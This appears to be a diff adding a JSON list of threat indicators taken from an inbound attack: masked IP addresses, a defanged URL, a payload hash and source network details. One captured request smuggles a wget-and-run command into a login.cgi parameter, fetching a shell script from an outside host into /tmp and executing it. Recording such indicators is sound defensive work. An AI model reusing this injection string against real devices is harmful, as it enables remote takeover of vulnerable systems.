@@ -1,0 +1,33 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "109.104.153.XXX"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://109.104.153.XXX/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "a0b248dd85e7226f7e96a23d6c15085c349217f47e09afbeb1785f31c71922a1"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "GET /login.cgi?cli=aa%20aa%27;wget%20http://109.104.153.XXX/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1"
+  },
+  {
+    "asn": "HKT Limited",
+    "country": "Hong Kong",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "219.79.105.XXX"
+  }
+]
